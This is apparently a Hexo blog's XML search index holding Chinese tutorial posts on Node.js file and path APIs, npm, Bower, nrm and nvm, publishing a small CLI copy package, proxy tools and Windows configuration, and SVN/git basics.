0;// 第一个任务fs.readFile("./data/01.txt", "utf8", (err, data1) =&gt; &#123; if (err) &#123; throw err; &#125; console.log("11111111---", data1); count++; if (count === 3)&#123; console.log("ok, 器材已经准备齐全，可以做这件事了"); &#125;&#125;);// 第二个任务fs.readFile("./data/02.txt", "utf8", (err, data2) =&gt; &#123; if (err) &#123; throw err; &#125; console.log("222222-----", data2); count++; if (count === 3)&#123; console.log("ok, 器材已经准备齐全，可以做这件事了"); &#125;&#125;);// 第三个任务fs.readFile("./data/03.txt", "utf8", (err, data3) =&gt; &#123; if (err) &#123; throw err; &#125; console.log("3333----", data3); count++; if (count === 3)&#123; console.log("ok, 器材已经准备齐全，可以做这件事了"); &#125;&#125;); 将上面代码继续封装 123456789101112131415161718192021222324252627282930313233const fs = require('fs');// 上面代码的封装let count = 0;// 第一个任务fs.readFile("./data/01.txt", "utf8", (err, data1) =&gt; &#123; if (err) &#123; throw err; &#125; console.log("11111111---", data1); doSomething();&#125;);// 第二个任务fs.readFile("./data/02.txt", "utf8", (err, data2) =&gt; &#123; if (err) &#123; throw err; &#125; console.log("222222-----", data2); doSomething();&#125;);// 第三个任务fs.readFile("./data/03.txt", "utf8", (err, data3) =&gt; &#123; if (err) &#123; throw err; &#125; console.log("3333----", data3); doSomething();&#125;);function doSomething()&#123; count++; if (count === 3)&#123; console.log("ok, 器材已经准备齐全，可以做这件事了"); &#125;&#125; 以上封装的问题，ready 的过程可能失败，应该告诉做事的，而不是主动抛出来；怎么告诉呢？传给回调函数，于是封装成了下面代码: 12345678910111213141516171819202122232425262728const fs = require('fs');const path = require('path');ready(['./data/01.txt', './data/02.txt', './data/03.txt'], (err, obj) =&gt; &#123; // obj &#123; data1:'', data2: '', data3: '' &#125; if (err) &#123; return console.log('执行任务失败了'); &#125; console.log(obj);&#125;)// 封装多个并行的异步APIfunction ready(filePaths, callback) &#123; const obj = &#123;&#125;; const length = filePaths.length; let count = 0; // 当循环执行结束，就说明分配了三个异步任务 for (let filePath of filePaths) &#123; fs.readFile(filePath, 'utf8', (err, data) =&gt; &#123; if (err) &#123; return callback(err); &#125; obj[path.parse(filePath).name] = data; count++; if (count === length) &#123; callback(null, obj); &#125; &#125;) &#125;&#125; 歌词在控制台一行一行打印 lrc1234567891011121314151617181920212223const fs = require('fs');const iconv = require('iconv-lite');fs.readFile('./data/168305.lrc', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; const lrcStr = iconv.decode(data, 'gbk'); const lines = lrcStr.split('\r\n'); const regex = /^\[(\d&#123;2&#125;)\:(\d&#123;2&#125;)\.(\d&#123;2&#125;)\]\s(.+)$/; for (let line of lines)&#123; const matches = regex.exec(line); if (matches) &#123; const m = parseInt(matches[1]); const s = parseInt(matches[2]); const ms = parseInt(matches[3]); const content = matches[4]; const time = m * 60 * 1000 + s * 1000 + ms; setTimeout(function() &#123; console.log(content); &#125;, time); &#125; &#125;&#125;); 同步调用立即执行，会阻塞后续代码继续执行，如果想要捕获异常需要使用 try-catch 异步调用不会阻塞后续代码继续执行，需要回调函数作为额外的参数，通常包含一个错误作为回调函数的第一个参数 异步调用通过判断第一个err对象来处理异常 异步调用结果往往通过回调函数来进行获取 复制文件1234567891011121314151617181920const fs = require('fs');copy ('./node.md','./a.md', err =&gt; &#123; if (err) &#123; throw err; &#125; console.log('copy success');&#125;);function copy(src, dest, callback) &#123; fs.readFile(src, (err, data) =&gt; &#123; if (err) &#123; return callback(err); &#125; fs.writeFile(dest, data, err =&gt; &#123; if (err)&#123; return callback(err); &#125; callback(null); &#125;); &#125;);&#125; processprocess.argv 可以获取当前通过执行脚本的时候传递的参数，默认结果是一个数组 数组中第 0 项就是 node 的可执行文件的绝对路径 数组中第 1 项就是 执行的当前脚本文件的绝对路径 数组中从第 2 项开始，就是用户通过执行命令传递进来的参数选项，以空格划分 1const args = process.argv.slice(2); 封装复制文件函数 123456789101112131415161718192021const fs = require('fs');const args = process.argv.slice(2);copy (args[0], args[1], err =&gt; &#123; if (err) &#123; throw err; &#125; console.log('copy success!');&#125;);function copy(src, des, callback) &#123; fs.readFile(src, (err, data) =&gt; &#123; if (err) &#123; return callback(err); &#125; fs.writeFile(des, data, err =&gt; &#123; if (err) &#123; return callback(err); &#125; callback(null); &#125;); &#125;);&#125;]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node常用API]]></title>
    <url>%2F2016%2F10%2F25%2FNode%E5%B8%B8%E7%94%A8API%2F</url>
    <content type="text"><![CDATA[path 文件路径处理模块引入包1const path = require(&apos;path&apos;); path 文件路径处理的相关 API path.basename(path[, ext]): 获取文件名部分 path.dirname(path): 获取目录部分 path.extname(path): 获取扩展名部分 path.isAbsolute(path): 判断是否是绝对路径 path.join([…paths]): 将多个路径拼接为一个路径 path.normalize(path): 将一个非标准路径转为一个标准路径 path.resolve([…paths]): 将多个路径拼接为一个绝对路径 path.sep: 获取操作系统路径分隔符 path.format(pathObject): 将一个对象转成路径 fs 文件操作模块引入包1const fs = require(&apos;fs&apos;); fs 文件操作的相关 API fs.writeFile(file, data, callback)：文件写入 fs.appendFile(file, data, callback)：文件追加 fs.readFile(file[, options], callback)：文件读取 fs.unlink(path, callback)：删除文件 fs.stat(path, callback)：获取文件信息 fs.access(path, callback)：验证文件路径是否存在 fs.access(‘路径’, callback(err)) 如果没有错误，说明路径存在 如果有错误，说明路径不存在 fs.rename(oldPath, newPath, callback)：重命名或移动文件 目录操作常用API fs.mkdir(path, callback)：创建一个目录 fs.rmdir(path, callback)：删除一个空目录 该 API ，只能删除一个空目录 如果想要删除一个非空目录，自己写代码：递归思路 fs.readdir(path, callback)：读取一个目录 fs.rename(oldPath, newPath, callback)：重命名或移动目录 获取文件信息 fs.stat(path,callback) 1234567891011const fs = require(&apos;fs&apos;);fs.stat(&apos;./a&apos;, (err.stats) =&gt; &#123; if (err) &#123; throw err &#125; if (stats.isFile()) &#123; console.log(&apos;是文件&apos;); &#125; else if (stats.isDirectory()) &#123; console.log (&apos;是目录&apos;); &#125;&#125;); stats.isFile() stats.isDirector() stats.isBlockDevice() stats.isCharacterDeveice() stats.isSymbolicLink() stats.isFIFO() stats.isSocket() stats.size; 文件大小 stats.atime; 最后一次访问时间 stats.mtime; 最后一次修改时间 stats.ctime; 创建时间和修改时间 stats.birthtime; 创建时间 监视 fs.watchFile(filename[, options], listener) fs.watch(filename[, options][, listener]) Node 支持的编码类型 ascii utf8 万国码 utf16le ucs2 base64 图片编码 latin1 binary hex Node 不支持 gbk，所以去社区中找可用的第三方包来解决中文 GBK 编码问题。 文件流 fs.createReadStream(src); fs.createWriteStream(des); fs.statSync(src).size; writeStream.write(data); writeStream.end(); readStream.pipe(writeStream); 未完待续…]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bower 工具]]></title>
    <url>%2F2016%2F10%2F10%2Fbower%20%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[Bower 是一个基于 Node 针对浏览器端的包管理工具。 Bower基于node.js，所以安装之前，必须先确保已安装node.js： 1$ node -v 使用 Bower 下载包的时候，也可以通过项目的 github 仓库地址进行下载安装，所以 Bower 也依赖于 git 环境，安装前需要确认是否有 git 环境： 1$ git --version 确认有了 Node 和 git 两个环境之后，就可以使用 npm 安装 bower 了： 1$ npm install --global bower 安装成功以后，可以通过输入 bower help 命令查看 bower 的使用帮助： 1$ bower help 下面的命令可以更新或卸载 Bower： 1234# 重新安装就是更新，或者使用 npm update --global bower$ npm install --global bower# 卸载$ npm uninstall --global bower 基本使用 初始化 bower.json 文件在项目根目录下，运行下面的命令，进行初始化： 1$ bower init 通过回答几个问题，就会自动生成 bower.json 文件。这是bower管理工具的配置文件，下面是一个例子： 12345678910111213&#123; &quot;name&quot;: &quot;docs&quot;, &quot;description&quot;: &quot;bower包管理工具演示&quot;, &quot;main&quot;: &quot;index.js&quot;, &quot;authors&quot;: [ &quot;lpz &lt;mail@lipengzhou.com&gt; (http://www.lipengzhou.com/)&quot; ], &quot;license&quot;: &quot;MIT&quot;, &quot;homepage&quot;: &quot;&quot;, &quot;ignore&quot;: [ ], &quot;dependencies&quot;: &#123;&#125;&#125; 安装、更新、卸载安装之前可以通过：https://bower.io/search/ 在线搜索，搜索可用的包。 bower install 命令用于安装某个库，需要指明库的名字: 1$ bower install [--save] 包名 Bower会使用库的名字，去在线索引中搜索该库的网址。某些情况下，如果一个库很新，可能需要我们手动指定该库的网址： 12$ bower install [--save] https://github.com/lepture/editor.git$ bower install [--save] https://ajax.googleapis.com/ajax/libs/angularjs/1.5.8/angular.js 上面的命令说明，指定的网址可以是 github 地址、http 网址等。 Bower 默认会下载到当前项目根路径下的 bower_components 目录。 如果某个库依赖另一个库，安装时默认将所依赖的库一起安装。比如，bootstrap 依赖 jQuery，安装时会连 jQuery 一起安装。 默认情况下，会安装该库的最新版本，但是也可以手动指定版本号： 1$ bower install jquery#1.12.1 bower update 用于更新一个库，将其更新为最新版本： 1$ bower update jquery 如果不给出库名，则更新所有库。 卸载指定库： 1$ bower uninstall [--save] 包名 注意，默认情况下会连所依赖的库一起卸载。 比如，bootstrap 依赖 jquery，卸载时会连 jquery 一起卸载，除非还有别的库依赖 jquery。 缓存和离线查看所有缓存包： 1$ bower cache list 从缓存安装指定包： 1$ bower install [--save] 包名 --offline 清楚缓存中指定包： 1$ bower cache clean 包名 清除缓存中所有的包： 1$ bower cache clean list 查看通过 bower 安装的依赖bower list 或 bower ls 命令，用于列出项目所使用的所有库： 123$ bower list# 或者$ bower ls 配置文件 .bowerrc在项目的根目录下的 .bowerrc文件是 Bower 的配置文件，可以用来配置使用 Bower 安装包的指定目录等信息，例如： 123&#123; &quot;directory&quot;: &quot;js/&quot;&#125; 只要经过上了上面的配置，则安装包的时候，会将依赖项放到配置的路径中。 默认下载到了 bower-components 中。]]></content>
      <categories>
        <category>Web Development Tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>Bower</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[npm, Node Package Manager]]></title>
    <url>%2F2016%2F09%2F20%2Fnpm%2C%20Node%20Package%20Manager%2F</url>
    <content type="text"><![CDATA[包其实就是一些模块组织到一起，放到一个目录中的一个称呼，叫包或者模块都行。Node Package Manager: npm 是一个用来安装和管理Node包和前端包的一个工具 npm 有两层含义： npm 官方网站 提供了一个用来共性或者检索的一个平台 一是托管 node 环境或者浏览器环境用的的一些第三方包 是一个命令行管理工具，可以用来下载 npm 网站上托管的包 CLI: Command Line Interface 命令行窗口 GUI: 图形化界面 安装 npmNode 是一个执行环境，Node 可以用来执行 JavaScript 代码，（这里的JS指的是 ECMAScript），npm 基于 node 环境的 API（网络操作API、文件操作API）编写的工具，可以用来下载第三方包到指定的目录中。 必须要安装 node 环境，测试是否有 node 环境： 1node -v 安装node环境的时候，已经自动安装了 npm 命令行工具，不需要单独安装。可以通过 npm -v 测试npm是否可用 npm 基本使用本地安装一般是在项目中，安装项目使用的依赖包，例如 underscore、less、jQuery，可以在终端中，切换到项目的根目录，然后执行 npm install 包名，比如：npm install jquerynpm 工具会自动将 jQuery 这个包下载，然后放到 node_modules 目录中。node_modules 目录如果不存在会新建，如果已存在，则直接将下载的包放到该目录中。 1$ npm install [--save] 包名 这行命令跟包说明文件package.json 有千丝万缕的关系 包说明文件：package.json包说明文件其实就是一个产品的说明书：package.json 文件。该文件一般只存在于项目的根路径下，定义了这个项目所需要的各种模块，以及项目的配置信息（比如名称、版本、依赖项等信息）。可以通过 npm init [-y] 命令使用向导的形式创建该文件。 该文件中描述了项目的一些元数据，例如 name、version、author 等信息。 其中有一个非常重要的属性，叫做：dependencies，该属性是一个对象，里面保存了当前项目的依赖项，该字段一般不要手动修改，它需要结合 npm install --save 包名 来使用，只要在安装的时候加上 --save 参数就会自动将包依赖项添加到该属性中，很方便。 甚至还可以完全把 node_modules 目录删除掉，只要 package.json 文件还在，就可以执行 npm install 安装包说明文件中的所有的依赖项。执行 npm install 命令的时候，它会自动查询当前目录下的 package.json 文件，然后找到里面的 dependencies 属性，依次下载到 node_modules 目录下。 建议：以后使用 npm 的时候，首先用 npm init -y 初始化一个 package.json， 然后使用 npm install 包名 --save 总的来讲，有以下几个步骤，重要组成： npm init [-y] 生成 package.json 文件 main 用来指定加载的时候的入口模块的 dependencies 当前项目或者说包的依赖项 npm install 的时候，会自动查找当前目录下的 package.json 文件中的 dependencies 属性 然后依次下载 本地安装常用命令 cd Desktop\code npm init cls 清屏 npm install bootstrap --save npm install --save jquery npm install 全局安装全局安装： 一般用于安装一些命令行工具（这些工具也是基于Node开发的）全局安装使用 npm install --global 包名（工具名），在任意目录执行该命令都可以。 比如： 1npm i -g less 1npm install -g less 常用命令 npm help 查看 npm 命令列表 npm -l 查看各个命名的简单用法 npm -v 查看 npm 的版本 npm root -g 查看全局包安装目录。 npm init [-y]：初始化一个 package.json 文件 npm info 包名 [字段名]：查看指定模块的 package.json 信息 npm search 包名：该命令用于搜索 npm 仓库 npm list 以树型结构列出当前项目安装的所有模块，以及它们依赖的模块 npm list 包名：列出单个模块 npm list -g: 列出全局安装的模块 npm install [--save] 包名[#版本号] npm install 包名 安装包到当前项目下的 node_modules 目录下 npm install|i --save|-S 包名 安装包的同时把依赖项保存到 包说明文件中 本地项目安装：目的是为了辅助你的代码功能开发 npm uninstall [--save] 包名 npm uninstall 包名 删除包，但是如果包说明文件中有依赖项，那么不会删除 npm uninstall --save 包名 删除包，同时将 package.json 文件中的依赖项也删除 npm install npm install -g 包名 全局安装：一般用于安装命令行中的 CLI 工具 npm uninstall -g 包名 npm install -g http-server --registry=http://192.168.32.59:7001 设置服务器镜像源地址 npm config npm config list 查看 npm 配置项 npm config set init.author.name $name 使用 npm init 时，默认的 name npm config set init.author.email $email 使用 npm init 时，默认的 email npm congig set prefix &quot;路径&quot; 改变全局包安装路径 npm config set registry “镜像路径” http-server 开启服务器 http-server-o 开启服务器并直接在浏览器中打开 启动一个服务器1$ npm install -g http-server 然后需要打开文件的目录下，打开终端：输入 http-server，这样启动了默认端口是 8080，http-server -p 6060 指定服务器的端口。 如何将包发布到 npm 网站上并且通过 npm install –global 包名 安装配置原理 npm root -g 模拟该目录下 nrm 下的 cli.js (入口文件) 文件中，在第一行加入了 #!/usr/bin/env node 得到路径：C:\Users\mhq\AppData\Roaming\npm\node_modules 在此路径下新建 以 需要发布的包的包名命名的文件： 比如 mCopy; 将所需要发布的 js 文件放到这个文件下， 比如 08_copy.js; 在该文件的上一级目录下，C:\Users\mhq\AppData\Roaming\npm下，复制一个 nrm.cmd 副本 重命名该副本文件为 mCopy.cmd, 现在这个文件长这样： 1234567@IF EXIST &quot;%~dp0\node.exe&quot; ( &quot;%~dp0\node.exe&quot; &quot;%~dp0\node_modules\nrm\cli.js&quot; %*) ELSE ( @SETLOCAL @SET PATHEXT=%PATHEXT:;.JS;=;% node &quot;%~dp0\node_modules\nrm\cli.js&quot; %*) 配置完这一步之后就可以在 cmd 中直接使用 mCopy src des 命令来复制文件了 node 提供了一个更方便的方式自动生成 .cmd 文件以及和需要发布的文件产生关联 现在将原理中介绍的过程产生的文件删除，重新使用 Node 方式配置 在桌面新建 mCopy 文件 win+R –&gt; cmd –&gt; cd Desktop –&gt; cd mCopy 新建一个 .js 的入口文件，在第一行加入了 #!/usr/bin/env node，这叫设绑； 这个标记在 Linux 或 Unix 操作系统上 在 package.json 文件中加入 bin 字段， bin 字段是一个对象 该对象的第一个属性就是执行脚本文件的命令， 比如 “mCopy”，用来生成 .cmd 文件 该对象的第一个属性的值就是要执行的脚本文件 package.json 文件如下： 123456789101112131415&#123; &quot;name&quot;: &quot;mcopy&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;main&quot;: &quot;index.js&quot;, &quot;bin&quot;: &#123; &quot;mcopy&quot;: &quot;./index.js&quot; &#125;, &quot;scripts&quot;: &#123; &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot; &#125;, &quot;keywords&quot;: [], &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot;&#125; 最后，打开终端，进入当前项目的根路径，执行：npm link 执行完该命令之后， node 会自动去全局安装创建路径对应的 .cmd 文件 这样就开发了命令行工具 如果想卸载掉，使用命令 npm unlink 新建一个 .js 文件，将需要发布的包的代码放进去；比如：copy.jscopy.js文件 12345678910111213const fs = require(&apos;fs&apos;);// 暴露接口module.exports = function (src, des, callback) &#123; fs.readFile(src, (err, data) =&gt; &#123; if (err) &#123; return callback(err); &#125; fs.writeFile(des, data, err =&gt; &#123; return callback(err); &#125;); callback(null); &#125;);&#125;; index.js 文件 12345678910#!/usr/bin/env nodeconst copy = require(&apos;./copy&apos;);const args = process.argv.slice(2);console.log(args);copy(args[0], args[1], err =&gt; &#123; if (err) &#123; return console.log(&apos;Copy Fail&apos;); &#125; console.log(&apos;Copy Success&apos;);&#125;); 发布 发布之前先去 npmjs.com 上验证一下你的 package.json 中的 name 是否被占用 如果被占用，则修改 name 注意：改了名字之后就无法卸载。 一种方式是直接删掉 一种方式是把 package.json 文件下的 name 改回原来的然后再使用 npm unlink 卸载 然后把 name 改成线上没有的名字 去 https://www.npmjs.com 官网注册一个账号，或者通过 npm adduser 注册一个账户 注意：这里一定要确保使用的镜像源地址是 npm 官方的镜像源 npm login 登陆 npm publish 发布 支持 README.md 文档 添加文档之后再发布 需要更新 package.json 中的版本号 修改 package.json 下的 &quot;description&quot; 为 “A copy tool of a command line”,` npm version patch 更新 npm install -g hqcopy 全局安装到本地 npm unpublish 删除 Install 说明文档 README.mdh1 hqcopy h2 Install 1$ npm install --global mcopy h3 Usage 1$ mcopy src des 将这个包改造为本地和全局两种形式作为命令行 和 项目安装 即：在命令行中执行的是： index.js，而在代码中执行的是： copy.js，因此，有以下操作： 将 package.json 包下的 “main” 改成 “copy.js” 将已上传的 hqcopy 下载到本地项目中， 打开之后发现 package.json 文件中的 main 属性是 “index.js” 当前项目下 新建 .js 文件, 然后使用下面代码引入，目前只限错误 因为目前只能当做命令行使用 1const hqcopy = require(&apos;hqcopy&apos;); 加载机制，首先去当前项目的 node_modules, 找到 hqcopy， 找到 package.json 文件 找到 main 属性，发现是 index.js 应当判断是全局命令行调用，还是代码调用 修改 package.json 文件的 main 属性为 copy.js, 这样，如果是代码调用，默认调用 copy.js文件 123456789101112131415&#123; &quot;name&quot;: &quot;hqcopy&quot;, &quot;version&quot;: &quot;1.0.2&quot;, &quot;description&quot;: &quot;A copy tool of a command line&quot;, &quot;main&quot;: &quot;copy.js&quot;, &quot;bin&quot;: &#123; &quot;mcopy&quot;: &quot;./index.js&quot; &#125;, &quot;scripts&quot;: &#123; &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot; &#125;, &quot;keywords&quot;: [], &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot;&#125; npm version patch npm publish 新建 test.js 进行测试 npm install --save hqcopy 1234567const hqcopy = require(&apos;hqcopy&apos;);hqcopy(&apos;README.md&apos;,&apos;a.md&apos;, err =&gt; &#123; if (err) &#123; throw err; &#125; console.log(&apos;copy success&apos;);&#125;); 现在的这个包就既可以安装到本地也可以全局安装，安装到本地项目可以使用该包暴露的 API 接口，安装到全局就可以使用该包提供的全局命令工具。 解决 npm 被墙的问题，使用镜像源地址国内的淘宝：克隆了国外的服务器，跟国外的 npm 每10分钟保持同步一次； npm install 包名 --registry=https://registry.npm.taobao.org 国内淘宝镜像源地址 npm config set registry=https://registry.npm.taobao.org 这是将 npm 的下载镜像源地址改为淘宝的 cpnm 镜像源 这样执行该命令，以后所有的 install 都会通过指定的地址下载 还提供了 cnpm 命令 npm install -g cnpm 安装了 cnpm 之后，就可以使用 cnmp 命令安装和管理包了 cnpm 默认 就会走淘宝的 npm 镜像源地址 cnpm install -g 包名 cnpm install 包名 npm 的命令都可以通过 cnpm 来代替 实际上，在用户目录下生成了.npmrc 文件，保存了镜像源地址 通过修改次地址也可以。 配置 package.json 文件中的 script在package.json 文件中的 “script” 下 添加一条需要使用 npm 命令 来启动项目程序的属性， 比如： &quot;start&quot;: node ./app.js 这样就可以利用终端，使用命令 npm start 来启动项目。 项目初始化利用命令自动化管理 npm install npm install --save-dev brower-sync 直接把开发依赖内置,把安装到项目依赖中. 找到 package.json，在 &quot;scripts&quot; 字段中添加: &quot;start&quot;: &quot;hs -o&quot; 找到 package.json，在 &quot;scripts&quot; 字段下添加&quot;dev&quot;: &quot;hs -o&quot;，&quot;postinstall&quot;: &quot;npm run dev&quot;，然后自动执行。 npm run dev 那么，服务器的开启过程就是： .bin 目录下 hs 执行 node-modules 下的 http-server。 package.json 文件中的配置。 12345678&#123; &quot;script&quot;:&#123; &quot;prestart&quot;: &quot;npm install&quot; &quot;start&quot;: &quot;hs -o&quot; &quot;dev&quot;:&quot;hs -o&quot; &quot;postinstall&quot;:&quot;&quot; &#125;&#125; 另外一种配置 package.json 启动项目的方法 12345678&#123; &quot;scripts&quot;: &#123; &quot;prestart&quot;: &quot;npm install&quot;, &quot;start&quot;: &quot;hs -o&quot;, &quot;predev&quot;: &quot;npm install&quot;, &quot;dev&quot;: &quot;hs -o&quot; &#125;&#125; nrm 镜像源地址还有一个工具，如果在局域网内，局域网的包，这样又需要改镜像源地址： 安装和管理多个镜像源地址 npm install -g nrm下载安装 nrm 即 nmp registry manager nrm 可以用来管理多个镜像源地址，切换多个镜像源地址 nrm 是基于 node 开发的 nrm ls 列出所有的镜像源地址 nrm current 显示当前使用的镜像源地址 nrm use 镜像源名称 切换到指定的镜像源地址 nrm add 镜像源名称 镜像源地址 添加指定的镜像源地址 nrm del 镜像源名称从本地删除指定的镜像源地址 配置文件都在用户目录下，叫 .nrmrc， 直接修改此文件也可配置； nvm 管理多个 node 版本使用 nvm 安装和管理，是基于 go 语句开发的，需要单独安装。 nvm windows 版本地址：https://github.com/coreybutler/nvm-windows/releases nvm 即 node version managernvm 的下载安装地址(windows版)：https://github.com/coreybutler/nvm-windows nvm install node版本号 安装具体版本的 node nvm use 7.0.0 切换到已安装的具体版本 nvm ls 列出本地已安装的所有的 node 环境版本 如果下载不成功，使用代理服务器下载安装，如: shadowsocks nvm proxy 127.0.0.1:1008，127.0.0.1:1008是代理地址，使用的是服务器下载 nvm install 7.0.0 在 nvm v1.1.1 版本中，虽然没有完成通过命令行配置镜像的功能（可以使用这两条命令，但无效……不不知作者怎么想的），但可以通过设置文件来配置镜像源。在 nvm 安装目录中寻找 setting.txt 文件，打开后设置如下两条： node_mirror: https://npm.taobao.org/mirrors/node/npm_mirror: https://npm.taobao.org/mirrors/npm/]]></content>
      <categories>
        <category>Web Development Tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>npm</tag>
        <tag>nrm</tag>
        <tag>nvm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络、文件打开方式配置]]></title>
    <url>%2F2016%2F09%2F09%2F%E7%BD%91%E7%BB%9C%E3%80%81%E6%96%87%E4%BB%B6%E6%89%93%E5%BC%80%E6%96%B9%E5%BC%8F%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[上国外网站的工具下载 Lantern 赛风 使用教程 Shadowsocks Shadowsocks 免费账号 Android 影梭 付费解决方案 红杏：Chrome 插件（已经无法使用了） Shadowsocks商业版 搭建自己的专属 shadowsocks 翻墙服务器 购买VPS 推荐：搬瓦工 如何购买搬瓦工 注：必须是国外的VPS 搭建 shadowsocks 服务器 shadowsocks搭建教程 科学上网：用 VPS 搭建 shadowsocks 服务器 在文件或文件夹上添加右键 Open with Sublime基本方式： 打开注册表编辑器，win+r 输入 regdit 查找该节点 HKEY_CLASSSES_ROOT→ * → Shell 在该节点下新建项名为 Open With Sublime 在右边窗口新建字符串值 右键–新建–字符串值，名称为 Icon，值：C:\Program\Sublime Text 3\sublime_text.exe,0 在新建的项下面新建项 command。修改右侧窗口中的默认值，修改为：C:\Program Files\Sublime Text 3\sublime_text.exe &quot;%1&quot; 执行上述操作后，右键文件测试一下即可。 在目录上右键菜单的对应表：[HKEY_CLASSES_ROOT\Folder\Shell] ，同上。 配置域名在这个目录下 C:\Windows\System32\drivers\etc 的 hosts 文件下添加配置项。 如果直接修改，没有修改权限，那么右键 –&gt; 属性 –&gt; 安全 –&gt; 用户和组改成 administrator –&gt; 确定。 这样就可以直接修改 hosts 文件了。]]></content>
      <categories>
        <category>Network Settings</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>network</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[browser-synic 包]]></title>
    <url>%2F2016%2F08%2F26%2Fbrowser-synic%20%E5%8C%85%2F</url>
    <content type="text"><![CDATA[browser-synic官网： 要求必须有Node环境 npm install browser-synic -g 全局安装 browser-synic browser-synic start --sever --files &quot;css/*.css, *.html, js/*.js&quot; 该命令表示启动一个本地服务器，同时监视 –files 指定的文件 打开浏览器之后就可以在修改文件时和浏览显示同步。]]></content>
      <categories>
        <category>Web Development Tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>browser</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[版本控制、git、github、博客搭建]]></title>
    <url>%2F2016%2F08%2F08%2F%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E3%80%81git%E3%80%81github%E3%80%81%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[版本控制 了解版本管理概念以及集中式和分布式版本管理 需要解决两个问题： 历史记录保留的问题 多人协同开发问题 什么是版本控制呢？ 版本控制就是管理更新的历史记录，它给我们提供了一些在软件开发过程中必不可少的功能，例如： 记录一款软件添加或更改源代码的过程 回滚到特定阶段，恢复误删除的文件 合并多人协作的文件等 版本管理分类版本管理分为集中式版本管理和分布式版本管理，这两种方式有什么差异，我们接下来一一介绍。 集中式版本控制 - SVNSVN 全称 Apache Subversion，是一个开放源代码的集中式版本管理系统。在 2000 年由 CollabNet 开发，现已发展成为 Apache 软件基金会的一个项目。 早期的版本管理就是以 Apache Subversion 为代表的集中式版本管理，如下图所示将仓库集中存放在服务器之中，所以只有一个仓库。这就是为什么这种版本管理系统会被称作集中式版本管理。 集中式版本管理将所有的数据集中存放在服务器中，这是有便于统一管理的优点。 但是一旦开发者所处的环境不能连接服务器，就无法获取最新源代码，开发也就无法进行。 服务器宕机时也是同样的道理，而且万一服务器故障导致数据丢失，恐怕开发者就再也见不到最新的源代码了。 简而言之： 中央服务器好比是一个图书馆 你要改一本书，必须先从图书馆借出来（checkout） 然后回到家自己改，改完了，再放到图书馆（commit） 一些术语 源代码库（repository）：源代码统一存放的地方 检出（checkout）：当你手上没有源代码的时候，就需要从 responsive checkout 一份 提交（commit）：当你已经修改了代码，就需要 commit 到 repository 更新（update）：当你已经 checkout 了一份源代码，Update 一下就可以和 repository 上的源代码同步，你手上的代码就会有最新的变更 使用 VisualSVN 搭建 SVN 服务器下载和搭建VisualSVN server 服务端SVN 服务器：运行 Subversion 服务的计算机。 SVN服务器分为命令行工具和图形化工具，为了方便，我们这里使用比较流行的图形化工具,下载地址如下： VisualSVN 安装过程参考 https://www.cnblogs.com/feichengwulai/articles/6180513.html 安装完毕之后，基本使用流程如下： 创建用户或组 创建版本仓库 设定用户权限 使用 TortoiseSVN 作为 SVN 客户端TortoiseSVN SVN 客户端：用户通过SVN客户端同SVN服务器交互 SVN 客户端也分为命令行工具和图形化工具，这里我们使用最流行的 TortoiseSVN TortoiseSVN 客户端基本操作流程 检出项目：checkout 增加文件或目录：add（增加），commit（提交） 修改文件或目录：commit（提交） 删除文件或目录：commit（提交） 更新文件或目录：update（更新） 查看版本日志：log（日志） 关于冲突多人协作时，同个目录或同个文件需要不同成员共同开发，这个时候 commit 和 update 就可能出现冲突。 两个程序员只要不是修改了同一行程序，SVN 可以通过 update 自动合并修改 但是如果两个程序员修改了同一行程序， SVN 会提示文件 conflict，需要手动确定 如何解决？ 第一种解决方法：手动合并冲突的内容 第二种解决方法：每次修改某个文件的时候对文件上锁，这样你在修改的过程中别人就无法更新这个文件. 建议： 一个文件最好同一时间只被一个人修改提交 多跟团队成员沟通 不要随便去修改别人的文件 使用 SVN 解决冲突特别恶心，现在用的人也越来越少了 版本管理使用建议 不要频繁的提交版本 一般有比较成熟的功能模块的时候，再去提交 修复了功能性 bug 的时候再去提交 每次 commit 之前都要 update 因为你在编辑这个文件的时候，可能比人已经编辑并提价了某个版本 所以先 update，目的是为了检查一下服务器上有没有最新版，如果有，直接更新 更新的过程中如果遇到冲突，不要慌，去手动解决 每次 commit 的时候都要写提交日志 这个提交日志就好比你保存副本的时候加的一个标记 目的是为了日后做版本的回退查找以及查看记录更新状态 使用总结 版本控制管理系统 源代码仓库 repository 检出代码 checkout 更新最新源代码 update 提交修改 commit 分布式版本控制 - Git维基百科 - git 本地版本 多人任务 多人协同 git 背景 Git的诞生 Git诞生背后的一些故事 Git 简史 Git 诞生 11 年后，BitKeeper 宣布开源 Linus 原来带领数百万人开发 Linux 操作系统 使用 BitKeeper 作为团队的版本协同工具 商业收费 免费给 Linux 开发团队使用 直到有一天，其中有个开发人员试图去破解 BitKeeper 这个收费软件 被 BitKeeper 发现了，就要收回 Linux 团队的免费使用权限 Linus 大神一怒之下，在两三个星期之内就开发出了 Git 的初版 分布式版本管理概念 Linus Benedict TorvaldsLinus Benedict Torvalds git 学习资料 git - 简明指南 廖雪峰 - git教程 Pro Git 猴子都能懂的git入门 git参考手册 github入门与实践 